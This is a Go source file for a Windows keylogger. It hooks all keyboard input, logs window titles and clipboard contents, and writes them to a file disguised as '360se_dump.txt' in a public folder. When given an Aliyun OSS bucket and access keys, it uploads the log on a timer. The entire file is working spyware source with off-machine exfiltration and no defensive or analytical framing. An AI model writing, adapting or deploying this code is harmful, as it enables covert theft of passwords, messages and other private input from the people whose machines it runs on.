package keylogger

import (
	"flag"
	"fmt"
	"log"
	"os"
	"strconv"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"github.com/TheTitanrain/w32"
	"github.com/aliyun/aliyun-oss-go-sdk/oss"
	"github.com/atotto/clipboard"
	"golang.org/x/sys/windows"
)

var keys_low = map[uint16]string{
	8:   "[Back]",
	9:   "[Tab]",
	10:  "[Shift]",
	13:  "[Enter]\r\n",
	14:  "",
	15:  "",
	16:  "",
	17:  "[Ctrl]",
	18:  "[Alt]",
	19:  "",
	20:  "", //CAPS LOCK
	27:  "[Esc]",
	32:  " ", //SPACE
	33:  "[PageUp]",
	34:  "[PageDown]",
	35:  "[End]",
	36:  "[Home]",
	37:  "[Left]",
	38:  "[Up]",
	39:  "[Right]",
	40:  "[Down]",
	41:  "[Select]",
	42:  "[Print]",
	43:  "[Execute]",
	44:  "[PrintScreen]",
	45:  "[Insert]",
	46:  "[Delete]",
	47:  "[Help]",
	48:  "0",
	49:  "1",
	50:  "2",
	51:  "3",
	52:  "4",
	53:  "5",
	54:  "6",
	55:  "7",
	56:  "8",
	57:  "9",
	65:  "a",
	66:  "b",
	67:  "c",
	68:  "d",
	69:  "e",
	70:  "f",
	71:  "g",
	72:  "h",
	73:  "i",
	74:  "j",
	75:  "k",
	76:  "l",
	77:  "m",
	78:  "n",
	79:  "o",
	80:  "p",
	81:  "q",
	82:  "r",
	83:  "s",
	84:  "t",
	85:  "u",
	86:  "v",
	87:  "w",
	88:  "x",
	89:  "y",
	90:  "z",
	91:  "[Windows]",
	92:  "[Windows]",
	93:  "[Applications]",
	94:  "",
	95:  "[Sleep]",
	96:  "0",
	97:  "1",
	98:  "2",
	99:  "3",
	100: "4",
	101: "5",
	102: "6",
	103: "7",
	104: "8",
	105: "9",
	106: "*",
	107: "+",
	108: "[Separator]",
	109: "-",
	110: ".",
	111: "[Divide]",
	112: "[F1]",
	113: "[F2]",
	114: "[F3]",
	115: "[F4]",
	116: "[F5]",
	117: "[F6]",
	118: "[F7]",
	119: "[F8]",
	120: "[F9]",
	121: "[F10]",
	122: "[F11]",
	123: "[F12]",
	144: "[NumLock]",
	145: "[ScrollLock]",
	160: "", //LShift
	161: "", //RShift
	162: "[Ctrl]",
	163: "[Ctrl]",
	164: "[Alt]", //LeftMenu
	165: "[RightMenu]",
	186: ";",
	187: "=",
	188: ",",
	189: "-",
	190: ".",
	191: "/",
	192: "`",
	219: "[",
	220: "\\",
	221: "]",
	222: "'",
	223: "!",
}

// SHIFT
var keys_high = map[uint16]string{
	8:   "[Back]",
	9:   "[Tab]",
	10:  "[Shift]",
	13:  "[Enter]\r\n",
	17:  "[Ctrl]",
	18:  "[Alt]",
	20:  "", //CAPS LOCK
	27:  "[Esc]",
	32:  " ", //SPACE
	33:  "[PageUp]",
	34:  "[PageDown]",
	35:  "[End]",
	36:  "[Home]",
	37:  "[Left]",
	38:  "[Up]",
	39:  "[Right]",
	40:  "[Down]",
	41:  "[Select]",
	42:  "[Print]",
	43:  "[Execute]",
	44:  "[PrintScreen]",
	45:  "[Insert]",
	46:  "[Delete]",
	47:  "[Help]",
	48:  ")",
	49:  "!",
	50:  "@",
	51:  "#",
	52:  "$",
	53:  "%",
	54:  "^",
	55:  "&",
	56:  "*",
	57:  "(",
	65:  "A",
	66:  "B",
	67:  "C",
	68:  "D",
	69:  "E",
	70:  "F",
	71:  "G",
	72:  "H",
	73:  "I",
	74:  "J",
	75:  "K",
	76:  "L",
	77:  "M",
	78:  "N",
	79:  "O",
	80:  "P",
	81:  "Q",
	82:  "R",
	83:  "S",
	84:  "T",
	85:  "U",
	86:  "V",
	87:  "W",
	88:  "X",
	89:  "Y",
	90:  "Z",
	91:  "[Windows]",
	92:  "[Windows]",
	93:  "[Applications]",
	94:  "",
	95:  "[Sleep]",
	96:  "0",
	97:  "1",
	98:  "2",
	99:  "3",
	100: "4",
	101: "5",
	102: "6",
	103: "7",
	104: "8",
	105: "9",
	106: "*",
	107: "+",
	108: "[Separator]",
	109: "-",
	110: ".",
	111: "[Divide]",
	112: "[F1]",
	113: "[F2]",
	114: "[F3]",
	115: "[F4]",
	116: "[F5]",
	117: "[F6]",
	118: "[F7]",
	119: "[F8]",
	120: "[F9]",
	121: "[F10]",
	122: "[F11]",
	123: "[F12]",
	144: "[NumLock]",
	145: "[ScrollLock]",
	160: "", //LShift
	161: "", //RShift
	162: "[Ctrl]",
	163: "[Ctrl]",
	164: "[Alt]", //LeftMenu
	165: "[RightMenu]",
	186: ":",
	187: "+",
	188: "<",
	189: "_",
	190: ">",
	191: "?",
	192: "~",
	219: "°",
	220: "|",
	221: "}",
	222: "\"",
	223: "!",
}

var capup = map[uint16]string{
	8:   "[Back]",
	9:   "[Tab]",
	10:  "[Shift]",
	13:  "[Enter]\r\n",
	14:  "",
	15:  "",
	16:  "",
	17:  "[Ctrl]",
	18:  "[Alt]",
	19:  "",
	20:  "", //CAPS LOCK
	27:  "[Esc]",
	32:  " ", //SPACE
	33:  "[PageUp]",
	34:  "[PageDown]",
	35:  "[End]",
	36:  "[Home]",
	37:  "[Left]",
	38:  "[Up]",
	39:  "[Right]",
	40:  "[Down]",
	41:  "[Select]",
	42:  "[Print]",
	43:  "[Execute]",
	44:  "[PrintScreen]",
	45:  "[Insert]",
	46:  "[Delete]",
	47:  "[Help]",
	48:  "0",
	49:  "1",
	50:  "2",
	51:  "3",
	52:  "4",
	53:  "5",
	54:  "6",
	55:  "7",
	56:  "8",
	57:  "9",
	65:  "A",
	66:  "B",
	67:  "C",
	68:  "D",
	69:  "E",
	70:  "F",
	71:  "G",
	72:  "H",
	73:  "I",
	74:  "J",
	75:  "K",
	76:  "L",
	77:  "M",
	78:  "N",
	79:  "O",
	80:  "P",
	81:  "P",
	82:  "R",
	83:  "S",
	84:  "T",
	85:  "U",
	86:  "V",
	87:  "W",
	88:  "X",
	89:  "Y",
	90:  "Z",
	91:  "[Windows]",
	92:  "[Windows]",
	93:  "[Applications]",
	94:  "",
	95:  "[Sleep]",
	96:  "0",
	97:  "1",
	98:  "2",
	99:  "3",
	100: "4",
	101: "5",
	102: "6",
	103: "7",
	104: "8",
	105: "9",
	106: "*",
	107: "+",
	108: "[Separator]",
	109: "-",
	110: ".",
	111: "[Divide]",
	112: "[F1]",
	113: "[F2]",
	114: "[F3]",
	115: "[F4]",
	116: "[F5]",
	117: "[F6]",
	118: "[F7]",
	119: "[F8]",
	120: "[F9]",
	121: "[F10]",
	122: "[F11]",
	123: "[F12]",
	144: "[NumLock]",
	145: "[ScrollLock]",
	160: "", //LShift
	161: "", //RShift
	162: "[Ctrl]",
	163: "[Ctrl]",
	164: "[Alt]", //LeftMenu
	165: "[RightMenu]",
	186: ";",
	187: "=",
	188: ",",
	189: "-",
	190: ".",
	191: "/",
	192: "`",
	219: "[",
	220: "\\",
	221: "]",
	222: "'",
	223: "!",
}

var (
	user32                  = windows.NewLazySystemDLL("user32.dll")
	procSetWindowsHookEx    = user32.NewProc("SetWindowsHookExW")
	procCallNextHookEx      = user32.NewProc("CallNextHookEx")
	procUnhookWindowsHookEx = user32.NewProc("UnhookWindowsHookEx")
	procGetMessage          = user32.NewProc("GetMessageW")
	procGetKeyState         = user32.NewProc("GetKeyState")
	procGetAsyncKeyState    = user32.NewProc("GetAsyncKeyState")
	procGetForegroundWindow = user32.NewProc("GetForegroundWindow")
	procGetWindowTextW      = user32.NewProc("GetWindowTextW")
	keyboardHook            HHOOK
	tmpKeylog               string
	vowelMin                string = "aeiou"
	vowelMaj                string = "AEIOU"
	writer                  Writer
)

const (
	WH_KEYBOARD_LL = 13
	WM_KEYDOWN     = 256
)

type (
	DWORD     uint32
	WPARAM    uintptr
	LPARAM    uintptr
	LRESULT   uintptr
	HANDLE    uintptr
	HINSTANCE HANDLE
	HHOOK     HANDLE
	HWND      HANDLE
)

type HOOKPROC func(int, WPARAM, LPARAM) LRESULT

type KBDLLHOOKSTRUCT struct {
	VkCode      DWORD
	ScanCode    DWORD
	Flags       DWORD
	Time        DWORD
	DwExtraInfo uintptr
}

type POINT struct {
	X, Y int32
}

type MSG struct {
	Hwnd    HWND
	Message uint32
	WParam  uintptr
	LParam  uintptr
	Time    uint32
	Pt      POINT
}

func CreateKeylogFile(path string) {
	file, err := os.Create(path)
	if err != nil {
	}
	defer file.Close()
	writer.file = file
}

func handleError(err error) {
	os.Exit(-1)
}

type Writer struct {
	file *os.File
}

func SetWindowsHookEx(idHook int, lpfn HOOKPROC, hMod HINSTANCE, dwThreadId DWORD) HHOOK {
	ret, _, _ := procSetWindowsHookEx.Call(
		uintptr(idHook),
		uintptr(syscall.NewCallback(lpfn)),
		uintptr(hMod),
		uintptr(dwThreadId),
	)
	return HHOOK(ret)
}

func CallNextHookEx(hhk HHOOK, nCode int, wParam WPARAM, lParam LPARAM) LRESULT {
	ret, _, _ := procCallNextHookEx.Call(
		uintptr(hhk),
		uintptr(nCode),
		uintptr(wParam),
		uintptr(lParam),
	)
	return LRESULT(ret)
}

func UnhookWindowsHookEx(hhk HHOOK) bool {
	ret, _, _ := procUnhookWindowsHookEx.Call(
		uintptr(hhk),
	)
	return ret != 0
}

func GetMessage(msg *MSG, hwnd HWND, msgFilterMin uint32, msgFilterMax uint32) int {
	ret, _, _ := procGetMessage.Call(
		uintptr(unsafe.Pointer(msg)),
		uintptr(hwnd),
		uintptr(msgFilterMin),
		uintptr(msgFilterMax))
	return int(ret)
}

func getForegroundWindow() (hwnd syscall.Handle, err error) {
	r0, _, e1 := syscall.Syscall(procGetForegroundWindow.Addr(), 0, 0, 0, 0)
	if e1 != 0 {
		err = error(e1)
		return
	}
	hwnd = syscall.Handle(r0)
	return
}

func getWindowText(hwnd syscall.Handle, str *uint16, maxCount int32) (len int32, err error) {
	r0, _, e1 := syscall.Syscall(procGetWindowTextW.Addr(), 3, uintptr(hwnd), uintptr(unsafe.Pointer(str)), uintptr(maxCount))
	len = int32(r0)
	if len == 0 {
		if e1 != 0 {
			err = error(e1)
		} else {
			err = syscall.EINVAL
		}
	}
	return
}

func WindowLogger() {

	var tmpTitle string
	for {
		g, _ := getForegroundWindow()
		b := make([]uint16, 200)
		_, err := getWindowText(g, &b[0], int32(len(b)))
		if err != nil {
		}
		if syscall.UTF16ToString(b) != "" {
			if tmpTitle != syscall.UTF16ToString(b) {
				tmpTitle = syscall.UTF16ToString(b)
				tmpKeylog += string("\r\n[" + tmpTitle + "]\r\n")

			}
		}

		time.Sleep(1 * time.Millisecond)
	}
}

var precLog string = ""

func Keylogger() {
	var msg MSG
	CAPS, _, _ := procGetKeyState.Call(uintptr(w32.VK_CAPITAL))
	CAPS = CAPS & 0x000001
	var CAPS2 uintptr
	var SHIFT uintptr

	//var write bool = false
	keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)(func(nCode int, wparam WPARAM, lparam LPARAM) LRESULT {
		if nCode == 0 && wparam == WM_KEYDOWN {
			SHIFT, _, _ = procGetAsyncKeyState.Call(uintptr(w32.VK_SHIFT))
			if SHIFT == 32769 || SHIFT == 32768 {

				SHIFT = 1
			}
			kbdstruct := (*KBDLLHOOKSTRUCT)(unsafe.Pointer(lparam))
			code := byte(kbdstruct.VkCode)
			if code == w32.VK_CAPITAL {
				if CAPS == 1 {
					CAPS = 0
				} else {
					CAPS = 1
				}
			}
			if SHIFT == 1 {
				CAPS2 = 1
			} else {
				CAPS2 = 0
			}

			if CAPS == 0 && CAPS2 == 0 {
				tmpKeylog += keys_low[uint16(code)]

			} else if CAPS2 == 1 {
				tmpKeylog += keys_high[uint16(code)]
			} else {
				tmpKeylog += capup[uint16(code)]
			}

		}
		if tmpKeylog != "" {
			savefile(tmpKeylog)
			precLog = tmpKeylog
			tmpKeylog = ""
		}
		return CallNextHookEx(keyboardHook, nCode, wparam, lparam)
	}), 0, 0)

	for GetMessage(&msg, 0, 0, 0) != 0 {
		time.Sleep(1 * time.Millisecond)
	}

	UnhookWindowsHookEx(keyboardHook)
	keyboardHook = 0
}

func clipboardLogger() {

	text, _ := clipboard.ReadAll()

	for {
		text1, _ := clipboard.ReadAll()
		if text1 != "" && text1 != text {
			tmpKeylog += string("\r\n[Clipboard: " + text1 + "]\r\n")
			text = text1

		}
		time.Sleep(20 * time.Millisecond)

	}

}

func getAppData() string {

	app := "C:\\Users\\Public\\Libraries\\"
	return app
}
func isExist(filename string) bool {
	_, err := os.Stat(filename)
	return err == nil
}

func savefile(str string) {
	directory := getAppData()
	dir := strings.Replace(directory, "\\", "/", -1)

	if !isExist(dir) {
		err := os.MkdirAll(dir, 0777)
		if err != nil {
			log.Fatal("cannot create directory")
		}
	}

	f, err := os.OpenFile(dir+"360se_dump.txt", os.O_RDWR|os.O_CREATE|os.O_APPEND, 0644)
	if err != nil {
		log.Fatalf("file open error : %v", err)
	}
	defer f.Close()
	log.SetOutput(f)
	log.Printf(str)
	time.Sleep(20 * time.Millisecond)
}

func upload(Endpoint string, AccessKeyId string, AccessKeySecret string, bucketName string, LocalFile string) {
	client, err := oss.New(Endpoint, AccessKeyId, AccessKeySecret)
	if err != nil {
		handleError(err)
	}

	bucket, err := client.Bucket(bucketName)
	if err != nil {
		handleError(err)
	}
	now := strconv.FormatInt(time.Now().Unix(), 10)
	myobject := now + ".log"
	err = bucket.PutObjectFromFile(myobject, LocalFile)
	if err != nil {
		handleError(err)
	} else {
		fmt.Println(time.Unix(time.Now().Unix(), 0).Format("2006-01-02 15:04:05") + ": upload " + myobject + " succeeded")
	}
}

func uploading(str1 []string, min int) {
	directory := getAppData()
	dir := strings.Replace(directory, "\\", "/", -1)
	t := time.NewTicker(time.Minute * time.Duration(min))
	defer t.Stop()
	for {
		<-t.C
		upload(str1[3], str1[1], str1[2], str1[0], dir+"360se_dump.txt")
	}
}

func Run() {
	var min int
	var osskey string

	flag.StringVar(&osskey, "o", "", "format: bucketName:accessKeyId:accessKeySecret:endpoint")
	flag.IntVar(&min, "t", 60, "Upload interval,default: 60min")
	flag.Parse()
	str1 := strings.Split(osskey, ":")
	if osskey != "" {
		go clipboardLogger()
		go WindowLogger()
		go uploading(str1, min)
		Keylogger()
	} else {
		go clipboardLogger()
		go WindowLogger()
		Keylogger()
	}

}
